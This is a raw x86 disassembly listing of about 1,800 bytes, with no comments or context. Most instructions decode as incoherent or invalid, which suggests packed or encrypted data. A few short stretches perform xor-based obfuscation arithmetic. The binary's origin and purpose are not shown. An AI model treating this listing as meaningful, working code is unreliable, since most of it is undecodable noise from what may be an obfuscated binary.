  409d55:	inc    esp
  409d56:	ffreep st(1)
  409d58:	push   esi
  409d59:	je     0x409cde
  409d5b:	enter  0x5fe7,0x98
  409d5f:	es and ecx,esp
  409d62:	mov    ebp,0x4771a01c
  409d67:	jns    0x409d9d
  409d69:	cli    
  409d6a:	adc    BYTE PTR [ecx+0x17],ch
  409d6d:	cs jns 0x409d50
  409d70:	pop    edi
  409d71:	mov    esi,0x174bc694
  409d76:	outs   dx,BYTE PTR ds:[esi]
  409d77:	nop
  409d78:	hlt    
  409d79:	(bad)  
  409d7a:	pop    ecx
  409d7b:	dec    esi
  409d7c:	sub    edi,DWORD PTR [edx+0x6cd09d7b]
  409d82:	aad    0x12
  409d84:	sbb    al,0x8c
  409d86:	sub    al,0x6e
  409d88:	push   esp
  409d89:	sub    bh,dh
  409d8b:	cmp    ebp,0x2d
  409d8e:	adc    ch,BYTE PTR [edi+esi*2+0x1b]
  409d92:	bound  esp,QWORD PTR [esi]
  409d94:	jns    0x409da2
  409d96:	mov    al,0x16
  409d98:	cmovae esi,ecx
  409d9b:	fwait
  409d9c:	and    ebp,DWORD PTR [edx]
  409d9e:	test   BYTE PTR ds:0xc1eba78f,dl
  409da4:	dec    ebp
  409da5:	cmp    BYTE PTR [eax-0x130eac4a],ah
  409dab:	sbb    cl,BYTE PTR [eax-0x51]
  409dae:	xchg   cl,ch
  409db0:	dec    esp
  409db1:	bound  ebx,QWORD PTR [esi]
  409db3:	add    ecx,DWORD PTR ds:0x3a2d93a4
  409db9:	stc    
  409dba:	cli    
  409dbb:	dec    eax
  409dbc:	adc    DWORD PTR [edx],ebp
  409dbe:	shl    BYTE PTR [esi+0x2089d1ae],cl
  409dc4:	pop    ss
  409dc5:	mov    ch,0x2b
  409dc7:	mov    ecx,0x65424064
  409dcc:	in     al,0x79
  409dce:	test   DWORD PTR [eax+ebp*1],ebp
  409dd1:	or     eax,0x897a1c7c
  409dd6:	push   0xffffff99
  409dd8:	adc    eax,0xd24510f1
  409ddd:	jge    0x409d7a
  409ddf:	pop    ecx
  409de0:	inc    ecx
  409de1:	out    0x86,eax
  409de3:	pop    ecx
  409de4:	sbb    ebx,ecx
  409de6:	cmp    esi,DWORD PTR [ebx+ebx*8-0x7e1f375d]
  409ded:	int3   
  409dee:	xor    eax,0x85e20d9d
  409df3:	ins    BYTE PTR es:[edi],dx
  409df4:	or     BYTE PTR [edi+0x47],0xcd
  409df8:	and    edx,DWORD PTR [ebx+eiz*2]
  409dfb:	aas    
  409dfc:	mov    cl,0x93
  409dfe:	hlt    
  409dff:	fisubr DWORD PTR [eax]
  409e01:	jl     0x409db2
  409e03:	in     al,0xaa
  409e05:	xor    DWORD PTR [ebp+0x20],ecx
  409e08:	mov    al,ds:0xe6e47ec
  409e0d:	fidiv  DWORD PTR [ebx-0x7d780a9d]
  409e13:	xchg   ebx,eax
  409e14:	jns    0x409e02
  409e16:	loopne 0x409da0
  409e18:	sub    DWORD PTR [eax-0x5e],eax
  409e1b:	jp     0x409e91
  409e1d:	nop
  409e1e:	pop    es
  409e1f:	aaa    
  409e20:	dec    esi
  409e21:	xor    DWORD PTR [ebp+0x41c55f91],0xffffffb7
  409e28:	sub    BYTE PTR [ecx-0x7bd555ab],al
  409e2e:	mov    ebx,0x4861fde4
  409e33:	add    eax,0xd721c307
  409e38:	jmp    0xb4a80005
  409e3d:	das    
  409e3e:	jae    0x409e1d
  409e40:	xchg   ah,bh
  409e42:	mov    ch,0x14
  409e44:	pop    es
  409e45:	sahf   
  409e46:	fld    DWORD PTR [esi+edi*2+0x62]
  409e4a:	jae    0x409de4
  409e4c:	jmp    0x94d14cc4
  409e51:	xchg   BYTE PTR [ebx-0x21],ah
  409e54:	ret    
  409e55:	jb     0x409e02
  409e57:	dec    esp
  409e58:	sbb    ecx,DWORD PTR [ebx+eiz*8]
  409e5b:	adc    eax,0x71361e33
  409e60:	pop    es
  409e61:	inc    ebp
  409e62:	add    dl,ah
  409e64:	push   ebp
  409e65:	or     ebp,DWORD PTR [edx+0x54]
  409e68:	jle    0x409e3d
  409e6a:	mov    ds:0xb2b84a33,eax
  409e6f:	shl    BYTE PTR [edi+eax*2-0x7321e369],0x4
  409e77:	rep outs dx,DWORD PTR ds:[esi]
  409e79:	or     ebp,DWORD PTR ds:[esp+edx*4-0x23]
  409e7e:	xchg   edx,eax
  409e7f:	mov    esp,DWORD PTR [edi-0x27]
  409e82:	dec    ecx
  409e83:	inc    edi
  409e84:	adc    al,0xf7
  409e86:	xchg   BYTE PTR [ebp+0x3f7af97b],dl
  409e8c:	xchg   ecx,eax
  409e8d:	cwde   
  409e8e:	jmp    0xee44:0xcd9744a
  409e95:	and    BYTE PTR [esi-0x5fbd3cb8],dh
  409e9b:	daa    
  409e9c:	or     esp,DWORD PTR [ecx+0x19942227]
  409ea2:	xchg   esp,eax
  409ea3:	fbld   TBYTE PTR [ecx+0xef4646]
  409ea9:	add    eax,0x5de5de32
  409eae:	dec    edi
  409eaf:	idiv   cl
  409eb1:	out    0x37,eax
  409eb3:	or     al,0x16
  409eb5:	jmp    0x6daf:0x1072c6a8
  409ebc:	push   ebp
  409ebd:	gs out dx,al
  409ebf:	jae    0x409edd
  409ec1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ec2:	mov    ah,0xae
  409ec4:	ja     0x409e87
  409ec6:	(bad)  
  409ec7:	dec    esp
  409ec8:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  409eca:	shl    BYTE PTR [ecx-0x9],cl
  409ecd:	add    ecx,DWORD PTR [ebx+0x6ede9da0]
  409ed3:	das    
  409ed4:	push   esi
  409ed5:	xchg   DWORD PTR [eax+eax*1+0x5],ecx
  409ed9:	lods   al,BYTE PTR ds:[esi]
  409eda:	outs   dx,DWORD PTR ds:[esi]
  409edb:	test   eax,0xf8984bc2
  409ee0:	cdq    
  409ee1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ee2:	loop   0x409ed6
  409ee4:	mov    bh,0x87
  409ee6:	(bad)  
  409ee7:	call   0x5f7f3700
  409eec:	imul   edx,DWORD PTR [edx],0x39
  409eef:	das    
  409ef0:	and    eax,0x3a27327a
  409ef5:	xchg   esi,eax
  409ef6:	cdq    
  409ef7:	arpl   WORD PTR [ebp+edi*2-0x79],cx
  409efb:	push   0x75
  409efd:	adc    cl,BYTE PTR [ecx]
  409eff:	jo     0x409f46
  409f01:	imul   eax,DWORD PTR [ebx+0x5e1bb130],0xffffffe1
  409f08:	push   DWORD PTR [esi+0x7207fdca]
  409f0e:	mov    al,ds:0x16192c65
  409f13:	jb     0x409f00
  409f15:	xor    BYTE PTR [ecx+ebx*2],ah
  409f18:	aas    
  409f19:	push   edx
  409f1a:	mov    ds:0xfcd7c38b,eax
  409f1f:	jmp    0x409ec1
  409f21:	in     al,dx
  409f22:	push   esi
  409f23:	sub    BYTE PTR [eax],ah
  409f25:	cmp    eax,0xfb8cd4da
  409f2a:	jl     0x409eef
  409f2c:	and    ch,ah
  409f2e:	add    eax,0x54b76ec3
  409f33:	mov    ebx,DWORD PTR [edi-0x7d40737a]
  409f39:	dec    esi
  409f3a:	or     DWORD PTR [edi+0x6d1073fc],0xa6eed709
  409f44:	lods   eax,DWORD PTR ds:[esi]
  409f45:	sbb    BYTE PTR [ecx+0x6318869c],dl
  409f4b:	push   esp
  409f4c:	push   edx
  409f4d:	stos   DWORD PTR es:[edi],eax
  409f4e:	xchg   ebx,eax
  409f4f:	mov    ds:0xfa28f970,eax
  409f54:	icebp  
  409f55:	fldenv [edx-0x56]
  409f58:	jle    0x409f37
  409f5a:	cmp    esi,edi
  409f5c:	lods   al,BYTE PTR ds:[esi]
  409f5d:	pop    ss
  409f5e:	jge    0x409eef
  409f60:	pop    esi
  409f61:	mov    cl,0x1f
  409f63:	cwde   
  409f64:	cmp    edx,DWORD PTR [eax]
  409f66:	rcr    ebp,1
  409f68:	xchg   edi,eax
  409f69:	sbb    al,0x6d
  409f6b:	jg     0x409f65
  409f6d:	and    eax,0xafa55cba
  409f72:	cmc    
  409f73:	sar    BYTE PTR [eax-0xf],0x52
  409f77:	adc    cl,cl
  409f79:	jp     0x409f94
  409f7b:	sahf   
  409f7c:	dec    edi
  409f7d:	jae    0x409f6a
  409f7f:	xchg   esi,eax
  409f80:	mov    dl,0x43
  409f82:	leave  
  409f83:	push   ebp
  409f84:	test   eax,0x4eafa5cb
  409f89:	lds    esi,FWORD PTR [edi+0x46]
  409f8c:	pcmpgtb mm6,QWORD PTR [edx]
  409f8f:	cmp    ebp,esp
  409f91:	mov    al,ds:0x4d187394
  409f96:	mov    edi,0x7d326e7b
  409f9b:	push   ebx
  409f9c:	not    DWORD PTR [ecx-0x6f28d938]
  409fa2:	dec    esi
  409fa3:	xor    al,0x25
  409fa5:	outs   dx,DWORD PTR ds:[esi]
  409fa6:	iret   
  409fa7:	pop    ebx
  409fa8:	pusha  
  409fa9:	(bad)  
  409faa:	xchg   esp,eax
  409fab:	xor    eax,0x408c7d4
  409fb0:	(bad)  
  409fb1:	or     al,0xdc
  409fb3:	jg     0x409fae
  409fb5:	rol    DWORD PTR [ebx*1+0x64dda439],cl
  409fbc:	jl     0x409f66
  409fbe:	out    dx,al
  409fbf:	into   
  409fc0:	test   al,0xc9
  409fc2:	lock stos BYTE PTR es:[edi],al
  409fc4:	jmp    0xbf5b:0xafe24b01
  409fcb:	iret   
  409fcc:	pop    ebx
  409fcd:	mov    al,ds:0x3c6808ac
  409fd2:	mov    ah,0x6b
  409fd4:	or     ebx,ebx
  409fd6:	cs mov esp,0xe129a3d8
  409fdc:	pop    ebx
  409fdd:	icebp  
  409fde:	pop    ds
  409fdf:	adc    al,0x5a
  409fe1:	jnp    0x409fd7
  409fe3:	sub    eax,0xae00c142
  409fe8:	add    edx,DWORD PTR [edx-0x3c]
  409feb:	std    
  409fec:	xchg   esi,eax
  409fed:	iret   
  409fee:	das    
  409fef:	sub    edx,DWORD PTR [esi]
  409ff1:	sub    eax,DWORD PTR [esi+0x11]
  409ff4:	fist   DWORD PTR [edi+edx*1]
  409ff7:	(bad)  
  409ff8:	test   DWORD PTR [ebx],0x72a6323f
  409ffe:	push   cs
  409fff:	sbb    eax,0x20024dd4
  40a004:	aaa    
  40a005:	xchg   ecx,eax
  40a006:	(bad)  
  40a007:	ror    bh,cl
  40a009:	mov    ecx,DWORD PTR [ebp-0x10]
  40a00c:	xor    eax,esi
  40a00e:	add    eax,edi
  40a010:	mov    DWORD PTR [ecx],eax
  40a012:	mov    eax,DWORD PTR [ebp-0x10]
  40a015:	mov    ecx,DWORD PTR [ebp+0x10]
  40a018:	jmp    0x40a339
  40a01d:	enter  0xca7a,0x5
  40a021:	enter  0xd1d5,0xd3
  40a025:	sbb    esi,esp
  40a027:	mul    DWORD PTR [ebx-0x2c]
  40a02a:	pushf  
  40a02b:	jb     0x40a010
  40a02d:	jo     0x40a01d
  40a02f:	jle    0x40a0af
  40a031:	jp     0x40a0b0
  40a033:	jle    0x40a0b3
  40a035:	xchg   ebp,eax
  40a037:	or     eax,0xd5ae01c6
  40a03c:	or     al,0xa6
  40a03e:	test   BYTE PTR [ebx-0x75c58e4d],cl
  40a044:	sbb    edx,ebx
  40a046:	dec    dh
  40a048:	in     eax,0x6e
  40a04a:	inc    ebp
  40a04b:	fs ins DWORD PTR es:[edi],dx
  40a04d:	add    al,0x4b
  40a04f:	out    dx,al
  40a050:	add    edx,DWORD PTR [ecx+0x34]
  40a053:	pop    ecx
  40a054:	adc    eax,0x2ce2215b
  40a059:	out    dx,eax
  40a05a:	repz xchg esp,eax
  40a05c:	sub    bh,BYTE PTR es:[eax]
  40a05f:	jg     0x40a026
  40a061:	cmp    bh,BYTE PTR ds:0x31243be9
  40a067:	loope  0x40a0b2
  40a069:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a06a:	dec    esi
  40a06b:	mov    ds:0x1cc43a79,al
  40a070:	ficomp WORD PTR [eax-0x41d640c8]
  40a076:	mov    cl,0xd5
  40a078:	jo     0x90abaf76
  40a07e:	add    eax,0x191dc621
  40a083:	mov    esp,es
  40a085:	in     eax,0xb4
  40a087:	pop    esp
  40a088:	call   0x7f07e81b
  40a08d:	addr16 pop ss
  40a08f:	mov    al,ds:0xb0a56f58
  40a094:	dec    edi
  40a095:	mov    WORD PTR [esi+0x8],?
  40a098:	pop    ebx
  40a099:	(bad)  
  40a09a:	sbb    al,0x65
  40a09c:	ds or  al,0x6c
  40a09f:	and    ah,ch
  40a0a1:	jne    0x40a025
  40a0a3:	cli    
  40a0a4:	(bad)  
  40a0a6:	mov    fs,WORD PTR [esi-0xc652db2]
  40a0ac:	test   DWORD PTR [edi],esp
  40a0ae:	arpl   WORD PTR [ecx-0x53],ax
  40a0b1:	mov    dl,0x5e
  40a0b3:	mov    ds:0xf14917cf,al
  40a0b8:	mov    dl,0xae
  40a0ba:	pop    edi
  40a0bb:	rcl    BYTE PTR [esi+0x5d],1
  40a0be:	test   al,0x16
  40a0c0:	fsubr  st(6),st
  40a0c2:	fcom   DWORD PTR [esi-0x5c]
  40a0c5:	or     DWORD PTR [edx+eax*4-0x35],0x5a
  40a0ca:	push   esp
  40a0cb:	lods   eax,DWORD PTR ds:[esi]
  40a0cc:	enter  0x6cfd,0xf2
  40a0d0:	(bad)  
  40a0d1:	mov    bl,0x6c
  40a0d3:	inc    edi
  40a0d4:	call   0x9dd4:0x5ef2eddf
  40a0db:	cwde   
  40a0dc:	stc    
  40a0dd:	mov    ebx,0xfb326523
  40a0e2:	xchg   DWORD PTR [esp-0x59572351],ebp
  40a0e9:	sub    edx,esp
  40a0eb:	mov    esp,0x66fc56ba
  40a0f0:	jmp    FWORD PTR ds:0xbfcc0d75
  40a0f6:	add    DWORD PTR ds:0xb6ac984e,ecx
  40a0fc:	jae    0x40a0d0
  40a0fe:	mov    ebx,0xe72b7c44
  40a103:	loopne 0x40a16c
  40a105:	push   ebp
  40a106:	sub    ch,ah
  40a108:	push   ebx
  40a109:	add    al,0x99
  40a10b:	or     eax,eax
  40a10d:	add    ah,dl
  40a10f:	fcmovnb st,st(5)
  40a111:	sub    al,0x7c
  40a113:	jl     0x40a159
  40a115:	and    cl,BYTE PTR [esi+0x13a6bf63]
  40a11b:	aas    
  40a11c:	(bad)  
  40a11d:	add    ebp,ebx
  40a11f:	push   ss
  40a120:	pushf  
  40a121:	fstp   DWORD PTR [esi+0x7e7830ac]
  40a127:	scas   al,BYTE PTR es:[edi]
  40a128:	sub    al,BYTE PTR [edx+0x6ee0c03d]
  40a12e:	pop    ebp
  40a12f:	fmul   QWORD PTR [ecx]
  40a131:	push   ebp
  40a132:	mov    ebp,0xd2b747e5
  40a137:	xor    BYTE PTR [ebx+ebx*2+0x1ea87a1c],ah
  40a13e:	pop    esi
  40a13f:	scas   al,BYTE PTR es:[edi]
  40a140:	lahf   
  40a141:	or     BYTE PTR [ebx-0x36e029b6],0xa1
  40a148:	ss xchg esp,eax
  40a14a:	fcom   DWORD PTR ds:0x43b7751c
  40a150:	jno    0x40a14a
  40a152:	mov    cl,0x85
  40a154:	pop    ss
  40a155:	adc    ebx,DWORD PTR [esi+0xb]
  40a158:	mov    eax,ds:0x7bb529d5
  40a15d:	scas   eax,DWORD PTR es:[edi]
  40a15e:	call   0x6fb11129
  40a163:	jmp    0x98a60da
  40a168:	(bad)  [edi]
  40a16a:	and    eax,0x58c3a7e4
  40a16f:	or     eax,0x83eac7b1
  40a174:	mov    BYTE PTR [ecx+0x7af3b293],0x37
  40a17b:	and    DWORD PTR [edi+0x6b],esp
  40a17e:	mov    ah,0x6a
  40a180:	dec    esi
  40a181:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a182:	std    
  40a183:	mov    ch,0xd5
  40a185:	repz popf 
  40a187:	cmp    dh,BYTE PTR [ebp+0x6f]
  40a18a:	xlat   BYTE PTR ds:[ebx]
  40a18b:	dec    edx
  40a18c:	mov    ss,ebx
  40a18e:	pop    DWORD PTR [ecx]
  40a190:	ja     0x40a164
  40a192:	cmp    eax,0xfb671030
  40a197:	push   esp
  40a198:	or     ebx,DWORD PTR [ebx-0x26]
  40a19b:	sub    DWORD PTR [ecx+0x3011a299],edi
  40a1a1:	inc    ecx
  40a1a2:	popa   
  40a1a3:	mov    cl,0x4a
  40a1a5:	popa   
  40a1a6:	imul   eax,DWORD PTR [esi-0x1d26461b],0xffffff8e
  40a1ad:	aad    0xe0
  40a1af:	mov    dl,0x6a
  40a1b1:	fnstcw WORD PTR [eax-0x659e644a]
  40a1b7:	in     al,dx
  40a1b8:	fstp   st(1)
  40a1ba:	add    eax,0xf47738f8
  40a1bf:	fbstp  TBYTE PTR [ecx+edx*2]
  40a1c2:	clc    
  40a1c3:	dec    eax
  40a1c4:	in     al,dx
  40a1c5:	aas    
  40a1c6:	jnp    0x40a243
  40a1c8:	add    DWORD PTR [ecx+0x75b5a22c],ecx
  40a1ce:	adc    BYTE PTR [esi],ch
  40a1d0:	or     al,0x57
  40a1d2:	fisttp WORD PTR [eax]
  40a1d4:	dec    edi
  40a1d5:	push   0xffffffdb
  40a1d7:	js     0x40a208
  40a1d9:	imul   eax
  40a1db:	add    al,0xf2
  40a1dd:	inc    edx
  40a1de:	fbld   TBYTE PTR [edx+0x6747ab08]
  40a1e4:	and    al,0xe5
  40a1e6:	es into 
  40a1e8:	loope  0x40a211
  40a1ea:	ror    BYTE PTR [edx+0x71],1
  40a1ed:	sub    eax,0x60e8501d
  40a1f2:	jae    0x40a273
  40a1f4:	xchg   DWORD PTR [ecx],esp
  40a1f6:	adc    bl,al
  40a1f8:	nop
  40a1f9:	mov    ds:0x264075aa,eax
  40a1fe:	push   edi
  40a1ff:	fistp  DWORD PTR [ebp+0x59bda75d]
  40a205:	sbb    BYTE PTR [eax+0x24],al
  40a208:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a209:	hlt    
  40a20a:	sub    BYTE PTR [ebx+0x60],dh
  40a20d:	out    0x36,al
  40a20f:	cld    
  40a210:	sar    DWORD PTR [ebx],cl
  40a212:	into   
  40a213:	inc    edi
  40a214:	sbb    BYTE PTR [edx-0x3c],bl
  40a217:	popf   
  40a218:	cdq    
  40a219:	lahf   
  40a21a:	sti    
  40a21b:	scas   eax,DWORD PTR es:[edi]
  40a21c:	lods   al,BYTE PTR ds:[esi]
  40a21d:	xor    eax,0x9046845
  40a222:	jmp    0xbeaa:0x5a693441
  40a229:	inc    esp
  40a22a:	xor    BYTE PTR [ebx+edx*4+0x5d],bh
  40a22e:	xchg   ebx,eax
  40a22f:	bound  edi,QWORD PTR [edx]
  40a231:	xlat   BYTE PTR ds:[ebx]
  40a232:	or     eax,0x93037488
  40a237:	add    esi,DWORD PTR [esi-0x32bd2337]
  40a23d:	xchg   BYTE PTR [ecx-0x37b43b10],cl
  40a243:	sahf   
  40a244:	fs push edx
  40a246:	pop    edx
  40a247:	rcl    DWORD PTR [eax-0x56],1
  40a24a:	xchg   edx,eax
  40a24b:	inc    eax
  40a24c:	and    esp,DWORD PTR [edi]
  40a24e:	jns    0x40a20d
  40a250:	or     esp,DWORD PTR [esi]
  40a252:	mov    ch,0x73
  40a254:	or     al,0x4f
  40a256:	in     eax,dx
  40a257:	and    BYTE PTR [ebx+eax*1],ch
  40a25a:	pop    esi
  40a25b:	xchg   ecx,eax
  40a25c:	xchg   BYTE PTR [ecx+0x64],dl
  40a25f:	rcl    DWORD PTR [eax+0x75],1
  40a262:	ds jnp 0x40a292
  40a265:	lods   al,BYTE PTR ds:[esi]
  40a266:	sub    al,0x94
  40a268:	xchg   esp,eax
  40a269:	lahf   
  40a26a:	sahf   
  40a26b:	pushf  
  40a26c:	arpl   WORD PTR [eax],cx
  40a26e:	sbb    edi,edi
  40a270:	test   al,0xbb
  40a272:	icebp  
  40a273:	inc    eax
  40a274:	stc    
  40a275:	add    DWORD PTR [ecx+0x49],0x3a
  40a279:	fild   DWORD PTR [edx+0x641994b1]
  40a27f:	and    DWORD PTR [ebx],0xbe8abc98
  40a285:	jg     0x40a2a8
  40a287:	add    edi,DWORD PTR [ebx+0x650d6c58]
  40a28d:	add    DWORD PTR [ebx-0x544eecf6],esp
  40a293:	cwde   
  40a294:	int    0x7b
  40a296:	rcr    bl,0xb6
  40a299:	or     esp,DWORD PTR [esi-0x12]
  40a29c:	(bad)  
  40a29d:	clc    
  40a29e:	pop    ebx
  40a29f:	mov    ds:0xc68bfdb6,eax
  40a2a4:	push   ds
  40a2a5:	adc    DWORD PTR [ebp+ebx*1+0x67f06525],0x23274423
  40a2b0:	sub    ch,BYTE PTR [eax+0x393d08d0]
  40a2b6:	xor    bl,BYTE PTR [ecx+eax*2]
  40a2b9:	ds dec ebp
  40a2bb:	pop    edi
  40a2bc:	(bad)  
  40a2bd:	cld    
  40a2be:	sbb    al,0xf6
  40a2c0:	test   DWORD PTR [ebp+ebp*4-0x5a957e0d],0xb63987a
  40a2cb:	sub    al,0x49
  40a2cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2ce:	scas   al,BYTE PTR es:[edi]
  40a2cf:	adc    eax,ecx
  40a2d1:	scas   al,BYTE PTR es:[edi]
  40a2d2:	(bad)  
  40a2d3:	loop   0x40a285
  40a2d5:	call   0x14fcf4ae
  40a2da:	rcr    DWORD PTR [ebx],cl
  40a2dc:	or     al,0x8f
  40a2de:	repz adc ah,BYTE PTR [edi-0x2f]
  40a2e2:	pop    ebx
  40a2e3:	icebp  
  40a2e4:	sub    eax,DWORD PTR [ecx+0x2393e010]
  40a2ea:	adc    al,0xd2
  40a2ec:	xlat   BYTE PTR ds:[ebx]
  40a2ed:	adc    bh,BYTE PTR [edi]
  40a2ef:	in     al,0xa7
  40a2f1:	mov    esp,0xc7bb4603
  40a2f6:	in     al,dx
  40a2f7:	xlat   BYTE PTR ds:[ebx]
  40a2f8:	pop    edx
  40a2f9:	xor    DWORD PTR [ecx],ebx
  40a2fb:	mov    dl,BYTE PTR [ebp+eiz*1-0x35b64aa0]
  40a302:	and    eax,0x9df2de86
  40a307:	int    0xa3
  40a309:	adc    eax,0xf7dea31
  40a30e:	loop   0x40a2a2
  40a310:	ja     0x40a31e
  40a312:	inc    esi
  40a313:	scas   eax,DWORD PTR es:[edi]
  40a314:	mov    esi,0xac82d731
  40a319:	outs   dx,DWORD PTR ds:[esi]
  40a31a:	cmp    eax,0xa595deb1
  40a31f:	xor    al,0xce
  40a321:	dec    ebx
  40a322:	or     al,0xed
  40a324:	mov    WORD PTR [ecx-0x1a],cs
  40a327:	mov    al,ds:0x5dcb9e77
  40a32c:	jno    0x40a395
  40a32e:	ret    
  40a32f:	xchg   ecx,eax
  40a330:	lods   eax,DWORD PTR ds:[esi]
  40a331:	cmp    edi,ebp
  40a333:	lock push edi
  40a335:	cdq    
  40a336:	into   
  40a337:	pop    DWORD PTR [edx+0x33]
  40a33a:	into   
  40a33b:	mov    edx,0xffcd8d65
  40a340:	sub    edx,ecx
  40a342:	add    DWORD PTR [eax],edx
  40a344:	mov    eax,ds:0x413cb2
  40a349:	mov    eax,DWORD PTR [eax]
  40a34b:	mov    cx,WORD PTR [ebp-0x4]
  40a34f:	movzx  ecx,cx
  40a352:	add    ecx,DWORD PTR [eax]
  40a354:	mov    DWORD PTR [ebp-0x18],ecx
  40a357:	mov    eax,DWORD PTR [ebp+0xc]
  40a35a:	mov    ecx,DWORD PTR [ebp+0xc]
  40a35d:	xor    eax,esi
  40a35f:	add    eax,eax
  40a361:	xor    ecx,esi
  40a363:	sub    ecx,eax
  40a365:	mov    ax,WORD PTR [ebp-0x4]
  40a369:	movzx  eax,ax
  40a36c:	sub    ecx,edi
  40a36e:	cmp    eax,ecx
  40a370:	mov    eax,DWORD PTR [ebp+0x10]
  40a373:	movzx  ecx,WORD PTR [ebp-0x4]
  40a377:	jg     0x40a38c
  40a37d:	xor    eax,esi
  40a37f:	sub    ecx,eax
  40a381:	sub    ecx,edi
  40a383:	mov    WORD PTR [ebp-0x4],cx
  40a387:	jmp    0x40a399
  40a38c:	xor    eax,esi
  40a38e:	lea    eax,[eax+ecx*1+0x32729b]
  40a395:	mov    WORD PTR [ebp-0x4],ax
  40a399:	mov    eax,DWORD PTR [ebp-0xc]
  40a39c:	cmp    eax,ebx
  40a39e:	je     0x40a3b2
  40a3a4:	mov    eax,DWORD PTR [ebp-0x8]
  40a3a7:	mov    DWORD PTR [eax],0x60341e89
  40a3ad:	jmp    0x40c082
  40a3b2:	mov    eax,DWORD PTR [ebp+0x8]
  40a3b5:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3b8:	xor    eax,esi
  40a3ba:	jmp    0x40a6db
  40a3bf:	retf   0x3136
  40a3c2:	out    dx,al
  40a3c3:	icebp  
  40a3c4:	jmp    0x20e2d69a
  40a3c9:	inc    ebx
  40a3ca:	popf   
  40a3cb:	sahf   
  40a3cc:	retf   
  40a3cd:	xchg   esi,eax
  40a3ce:	lahf   
  40a3cf:	jl     0x40a3bb
  40a3d1:	jle    0x40a451
  40a3d3:	jp     0x40a452
  40a3d5:	jle    0x40a455
  40a3d7:	inc    esp
  40a3d8:	iret   
  40a3d9:	lea    edi,[eax-0x593717f5]
  40a3df:	sar    BYTE PTR [edx-0x70],1
  40a3e2:	or     cl,BYTE PTR [eax+ebp*1]
  40a3e5:	sbb    cl,0x66
  40a3e8:	dec    eax
  40a3e9:	into   
  40a3ea:	fcomp  DWORD PTR [esi-0x35]
  40a3ed:	jl     0x40a44a
  40a3ef:	loop   0x40a411
  40a3f1:	retf   
  40a3f2:	xlat   BYTE PTR ds:[ebx]
  40a3f3:	mov    dl,BYTE PTR [ecx+0x2d]
  40a3f6:	pop    ecx
  40a3f7:	mov    dh,0x83
  40a3f9:	lods   al,BYTE PTR ds:[esi]
  40a3fa:	dec    esp
  40a3fb:	shr    BYTE PTR [ebp-0x159e53eb],0x42
  40a402:	imul   ebx,DWORD PTR [ecx-0xb],0xffffffea
  40a406:	pop    esp
  40a407:	bound  ebp,QWORD PTR [eax+0x7a]
  40a40a:	out    dx,eax
  40a40b:	stos   DWORD PTR es:[edi],eax
  40a40c:	xor    al,0x48
  40a40e:	das    
  40a40f:	mov    al,ds:0x37b504a
  40a414:	arpl   WORD PTR [ebp-0x29],dx
  40a417:	jl     0x40a3fa
  40a419:	(bad)
  40a41c:	ja     0x40a3bd
  40a41e:	enter  0xe996,0x85
  40a422:	xchg   ebp,eax
  40a423:	and    al,0x8c
  40a425:	adc    DWORD PTR [ecx+0x12],edi
  40a428:	push   ss
  40a429:	push   edi
  40a42a:	dec    esi
  40a42b:	fld    QWORD PTR [ebp-0x5e2dbef3]
  40a431:	stc    
  40a432:	jns    0x40a48a
  40a434:	push   ecx
  40a435:	out    dx,eax
  40a436:	(bad)  
  40a438:	gs shr ebx,cl
  40a43b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a43c:	jmp    FWORD PTR [ebp+0x26]
  40a43f:	jecxz  0x40a480
  40a441:	retf   0x712c
  40a444:	dec    edi
  40a445:	push   0x316854b1
  40a44a:	out    0xa9,eax
  40a44c:	pop    esp
  40a44d:	add    ebp,DWORD PTR [eax+0x6ddc2d1a]
  40a453:	pop    ss
  40a454:	in     eax,0x5c
  40a456:	jb     0x40a4b7
  40a458:	test   eax,0x2b4b6ea
  40a45d:	adc    eax,0x318a91d3
  40a462:	arpl   WORD PTR [esi+esi*1],di
  40a465:	leave  
  40a466:	sub    dl,BYTE PTR [eax-0x127d2057]
  40a46c:	pushf  
  40a46d:	mov    bl,0xb9
  40a46f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a470:	push   ebx
  40a471:	mov    ch,dh
  40a473:	add    BYTE PTR [esi-0x50],cl
  40a476:	rcl    ecx,cl
  40a478:	lea    esi,[eax]
  40a47a:	xchg   ebp,eax
  40a47b:	aas    
  40a47c:	pop    ecx
  40a47d:	pop    ds
  40a47e:	mov    ss,WORD PTR [edi]
  40a480:	push   esp
  40a481:	push   ebx
  40a482:	dec    esp
  40a483:	push   0x9f456026
  40a488:	sub    eax,0xfb24ce04
  40a48d:	or     al,0x9d
  40a48f:	test   al,0x35
  40a491:	sub    bl,ch
  40a493:	ins    BYTE PTR es:[edi],dx
  40a494:	ins    DWORD PTR es:[edi],dx
  40a495:	mov    eax,ds:0x36748a58
  40a49a:	push   esi
  40a49b:	or     bl,cl
  40a49d:	and    al,0x7f
  40a49f:	push   ss
  40a4a0:	fcmove st,st(7)
  40a4a2:	imul   BYTE PTR [ebx-0x39]
  40a4a5:	or     al,0xa0
  40a4a7:	imul   ecx,DWORD PTR [ebp-0x2a],0xffffffb0
  40a4ab:	and    DWORD PTR [edx+0x4ea9a18c],esp
  40a4b1:	data16 adc BYTE PTR [esi+0xf],dl
  40a4b5:	mov    edx,DWORD PTR [ebx+0x52531f3d]
  40a4bb:	pop    edx
  40a4bc:	xchg   ebp,eax
  40a4bd:	fwait
  40a4be:	push   0xb94c6b14
  40a4c3:	add    eax,0xe207a054
  40a4c8:	push   0xfffffff3
  40a4ca:	pop    ebx
  40a4cb:	xchg   DWORD PTR [ecx+0x7a43ec0f],esp
  40a4d1:	jmp    0x7cafad85
  40a4d6:	dec    ebp
  40a4d7:	cli    
  40a4d8:	call   0x55339483
  40a4dd:	sbb    DWORD PTR [ebx],esp
  40a4df:	mov    al,ds:0x263cde68
  40a4e4:	scas   al,BYTE PTR es:[edi]
  40a4e5:	lods   al,BYTE PTR ds:[esi]
  40a4e6:	aam    0x4b
  40a4e8:	je     0x40a4b4
  40a4ea:	pop    ebp
  40a4eb:	shl    bh,cl
  40a4ed:	sub    dl,BYTE PTR [edx]
  40a4ef:	push   ebp
